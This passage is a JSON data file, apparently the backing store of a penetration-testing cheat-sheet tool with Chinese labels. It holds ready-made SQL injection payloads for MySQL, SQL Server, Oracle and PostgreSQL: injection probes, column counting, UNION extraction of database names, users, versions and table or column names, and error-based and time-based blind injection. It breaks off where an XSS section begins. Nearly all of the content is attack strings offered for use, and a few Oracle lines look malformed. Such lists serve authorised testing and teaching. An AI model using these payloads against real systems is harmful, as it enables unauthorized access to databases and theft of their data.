{
  "categories": [
    {
      "id": "cat_sqli",
      "name": "SQL注入",
      "expanded": true,
      "subCategories": [
        {
          "id": "5e8cf9a4-2d3a-4b56-9637-3c2db1d13456",
          "name": "mysql注入",
          "entries": [
            {
              "id": "836bd467-b136-4d32-8614-31e6491ec054",
              "title": "探测注入点",
              "payload": "\u0027 OR \u00271\u0027\u003d\u00271\n\u0027 OR 1\u003d1--\n1\u0027 AND \u00271\u0027\u003d\u00271\n1\u0027 AND \u00271\u0027\u003d\u00272"
            },
            {
              "id": "d4a67644-69c3-4c02-8b19-a7b2c0c07207",
              "title": "确定数据库列数",
              "payload": "\u0027 ORDER BY 1--\n\u0027 ORDER BY 2--\n\u0027 ORDER BY 3--\n直到报错确定列数\n或使用:\n\u0027 UNION SELECT NULL--\n\u0027 UNION SELECT NULL,NULL--\n\u0027 UNION SELECT NULL,NULL,NULL--"
            },
            {
              "id": "7831b393-6dc7-40bb-8a5c-3a1532c40c3f",
              "title": "确定回显位置（回显注入）",
              "payload": "\u0027 UNION SELECT 1,2,3--\n\u0027 UNION SELECT \u0027a\u0027,\u0027b\u0027,\u0027c\u0027--"
            },
            {
              "id": "18d89e8c-4d79-49fb-9823-545d4db2fda7",
              "title": "获取数据库基础信息",
              "payload": "\u0027 UNION SELECT 1,database(),3--\n\u0027 UNION SELECT 1,user(),3--\n\u0027 UNION SELECT 1,version(),3--\n\u0027 UNION SELECT 1,@@hostname,3--"
            },
            {
              "id": "2f7e8c9a-1d2b-3c4d-5e6f-7a8b9c0d1e2f",
              "title": "报错注入（extractvalue/updatexml）",
              "payload": "\u0027 AND extractvalue(1,concat(0x7e,database(),0x7e))--\n\u0027 AND updatexml(1,concat(0x7e,user(),0x7e),1)--\n\u0027 AND updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema\u003ddatabase()),0x7e),1)--"
            },
            {
              "id": "3a8b9c0d-4e5f-6a7b-8c9d-0e1f2a3b4c5d",
              "title": "时间盲注（sleep/if）",
              "payload": "\u0027 AND IF(length(database())\u003e5,SLEEP(5),1)--\n\u0027 AND IF(ascii(substr(database(),1,1))\u003d115,SLEEP(5),1)--\n\u0027 AND IF((select count(*) from information_schema.tables where table_schema\u003ddatabase())\u003e10,SLEEP(5),1)--"
            }
          ]
        },
        {
          "id": "10edda04-6bc4-4d8d-a321-5f0e2abae920",
          "name": "SQLserver注入",
          "entries": [
            {
              "id": "f8b7c921-7e45-489d-8f1a-9e8b7d6c5b4a",
              "title": "探测注入点",
              "payload": "\u0027 OR \u00271\u0027\u003d\u00271--\n\u0027 OR 1\u003d1--\n1\u0027 AND \u00271\u0027\u003d\u00271\n1\u0027 AND \u00271\u0027\u003d\u00272\n\u0027;WAITFOR DELAY \u00270:0:5\u0027-- (时间盲注探测)"
            },
            {
              "id": "e7a8d912-6f54-478c-8e9b-8c7d6b5a4e3f",
              "title": "确定数据库列数",
              "payload": "\u0027 ORDER BY 1--\n\u0027 ORDER BY 2--\n直到报错确定列数\n或使用:\n\u0027 UNION SELECT NULL--\n\u0027 UNION SELECT NULL,NULL--\n注意：SQLServer UNION需前后列数/类型一致"
            },
            {
              "id": "d6b9e803-5e43-467b-7d8a-7b6a5d4c3b2a",
              "title": "确定回显位置（回显注入）",
              "payload": "\u0027 UNION SELECT 1,2,3--\n\u0027 UNION SELECT \u0027a\u0027,\u0027b\u0027,\u0027c\u0027--\n\u0027 UNION SELECT @@VERSION,USER_NAME(),DB_NAME()--"
            },
            {
              "id": "c5c0f794-4d32-456a-6c7b-6a5d4c3b2a19",
              "title": "获取数据库基础信息",
              "payload": "\u0027 UNION SELECT 1,DB_NAME(),3--\n\u0027 UNION SELECT 1,SYSTEM_USER,3--\n\u0027 UNION SELECT 1,@@VERSION,3--\n\u0027 UNION SELECT 1,HOST_NAME(),3--\n\u0027 UNION SELECT 1,SERVERPROPERTY(\u0027productversion\u0027),3--"
            },
            {
              "id": "b4d1e685-3c21-4459-5b6c-594b3a2c1d08",
              "title": "读取系统表（表名/列名）",
              "payload": "\u0027 UNION SELECT 1,name,3 FROM sys.tables--\n\u0027 UNION SELECT 1,COLUMN_NAME,3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME\u003d\u0027表名\u0027--"
            },
            {
              "id": "4b9c0d1e-5f2a-6b3c-7d4e-8f5a0b1c2d3e",
              "title": "报错注入（convert/CAST）",
              "payload": "\u0027 AND convert(int,(select db_name()))--\n\u0027 AND CAST((select system_user) as int)--\n\u0027 AND CAST((select @@version) as int)--\n\u0027 AND CAST((select name from sys.tables where object_id\u003d1) as int)--"
            },
            {
              "id": "5c0d1e2f-6a3b-7c4d-8e5f-9a0b1c2d3e4f",
              "title": "时间盲注（waitfor delay）",
              "payload": "\u0027 IF (LEN(DB_NAME())\u003e5) WAITFOR DELAY \u002700:00:05\u0027--\n\u0027 IF (ASCII(SUBSTRING(DB_NAME(),1,1))\u003d100) WAITFOR DELAY \u002700:00:05\u0027--\n\u0027 IF (EXISTS(SELECT * FROM sys.tables)) WAITFOR DELAY \u002700:00:05\u0027--"
            }
          ]
        },
        {
          "id": "c234bcc8-005c-46d2-a633-ee4e548a79d2",
          "name": "Oracle注入",
          "entries": [
            {
              "id": "a3e2d576-2b10-4348-4a5d-483c2b1a09f7",
              "title": "探测注入点",
              "payload": "\u0027 OR \u00271\u0027\u003d\u00271\n\u0027 OR 1\u003d1--\n1\u0027 AND \u00271\u0027\u003d\u00271\n1\u0027 AND \u00271\u0027\u003d\u00272\n\u0027;dbms_lock.sleep(5)-- (时间盲注探测，需权限)"
            },
            {
              "id": "92f1c467-1a09-4237-3b4c-372b1a09f8e6",
              "title": "确定数据库列数",
              "payload": "\u0027 ORDER BY 1--\n\u0027 ORDER BY 2--\n直到报错确定列数\n或使用:\n\u0027 UNION SELECT NULL FROM DUAL--\n\u0027 UNION SELECT NULL,NULL FROM DUAL--\n注意：Oracle需加FROM DUAL"
            },
            {
              "id": "81e0b358-09f8-4126-2c3d-261a09f8e7d5",
              "title": "确定回显位置（回显注入）",
              "payload": "\u0027 UNION SELECT 1,2,3 FROM DUAL--\n\u0027 UNION SELECT \u0027a\u0027,\u0027b\u0027,\u0027c\u0027 FROM DUAL--"
            },
            {
              "id": "70d9a249-f8e7-4015-1d2e-1509f8e7d6c4",
              "title": "获取数据库基础信息",
              "payload": "\u0027 UNION SELECT 1,SYS_CONTEXT(\u0027USERENV\u0027,\u0027CURRENT_SCHEMA\u0027),3 FROM DUAL--\n\u0027 UNION SELECT 1,USER,3 FROM DUAL--\n\u0027 UNION SELECT 1,VERSION FROM V$INSTANCE--\n\u0027 UNION SELECT 1,HOST_NAME FROM V$INSTANCE--"
            },
            {
              "id": "69c89130-e7d6-3904-0e1f-0498e7d6c5b3",
              "title": "读取系统表（表名/列名）",
              "payload": "\u0027 UNION SELECT 1,TABLE_NAME,3 FROM ALL_TABLES WHERE OWNER\u003d\u0027用户名\u0027--\n\u0027 UNION SELECT 1,COLUMN_NAME,3 FROM ALL_TAB_COLUMNS WHERE TABLE_NAME\u003d\u0027表名\u0027--"
            },
            {
              "id": "6d1e2f3a-7b4c-8d5e-9f0a-1b2c3d4e5f6a",
              "title": "报错注入（utl_inaddr/get_host_name）",
              "payload": "\u0027 AND utl_inaddr.get_host_name((select user from dual)) is not null--\n\u0027 AND (select count(*) from all_tables where rownum\u003d1 and owner\u003duser)||chr(126) raises error--\n\u0027 AND dbms_xdb_version.checkin((select banner from v$version where rownum\u003d1)) is not null--"
            },
            {
              "id": "7e2f3a4b-8c5d-9e6f-0a1b-2c3d4e5f6a7b",
              "title": "时间盲注（dbms_lock.sleep）",
              "payload": "\u0027 AND dbms_lock.sleep(5) FROM dual WHERE length(user)\u003e3--\n\u0027 AND (CASE WHEN ascii(substr(user,1,1))\u003d83 THEN dbms_lock.sleep(5) ELSE 1 END) FROM dual--\n\u0027 AND (CASE WHEN EXISTS(SELECT * FROM all_tables) THEN dbms_lock.sleep(5) ELSE 1 END) FROM dual--"
            }
          ]
        },
        {
          "id": "8cfc7983-9a8a-4d2f-b4c7-e6e9a271e2bf",
          "name": "pgSQL注入",
          "entries": [
            {
              "id": "58b78021-d6c5-3893-f90e-f387d6c5b4a2",
              "title": "探测注入点",
              "payload": "\u0027 OR \u00271\u0027\u003d\u00271--\n\u0027 OR 1\u003d1--\n1\u0027 AND \u00271\u0027\u003d\u00271\n1\u0027 AND \u00271\u0027\u003d\u00272\n\u0027;SELECT pg_sleep(5)-- (时间盲注探测)"
            },
            {
              "id": "47a67912-c5b4-3782-e89d-e276c5b4a3f1",
              "title": "确定数据库列数",
              "payload": "\u0027 ORDER BY 1--\n\u0027 ORDER BY 2--\n直到报错确定列数\n或使用:\n\u0027 UNION SELECT NULL--\n\u0027 UNION SELECT NULL,NULL--"
            },
            {
              "id": "36b56803-b4a3-3671-d78c-d165b4a3f2e0",
              "title": "确定回显位置（回显注入）",
              "payload": "\u0027 UNION SELECT 1,2,3--\n\u0027 UNION SELECT \u0027a\u0027,\u0027b\u0027,\u0027c\u0027--"
            },
            {
              "id": "25c45694-a3f2-3560-c67b-c054a3f2e1d9",
              "title": "获取数据库基础信息",
              "payload": "\u0027 UNION SELECT 1,current_database(),3--\n\u0027 UNION SELECT 1,current_user,3--\n\u0027 UNION SELECT 1,version(),3--\n\u0027 UNION SELECT 1,inet_server_addr(),3--"
            },
            {
              "id": "14d34585-92e1-3459-b56a-b943f2e1d0c8",
              "title": "读取系统表（表名/列名）",
              "payload": "\u0027 UNION SELECT 1,tablename,3 FROM pg_tables WHERE schemaname\u003d\u0027public\u0027--\n\u0027 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name\u003d\u0027表名\u0027--"
            },
            {
              "id": "8f3a4b5c-9d6e-0f1a-2b3c-4d5e6f7a8b9c",
              "title": "报错注入（cast/convert）",
              "payload": "\u0027 AND cast(current_database() as int)--\n\u0027 AND convert(int,current_user)--\n\u0027 AND (select relname from pg_class where relkind\u003d\u0027r\u0027 limit 1)::int--"
            },
            {
              "id": "9a4b5c6d-0e7f-1a2b-3c4d-5e6f7a8b9c0d",
              "title": "时间盲注（pg_sleep）",
              "payload": "\u0027 AND pg_sleep(5) WHERE length(current_database())\u003e5--\n\u0027 AND (CASE WHEN ascii(substr(current_user,1,1))\u003d112 THEN pg_sleep(5) ELSE 0 END)--\n\u0027 AND pg_sleep(5) WHERE exists(select * from pg_tables where tablename like \u0027%user%\u0027)--"
            }
          ]
        }
      ]
    },
    {
      "id": "cat_xss",
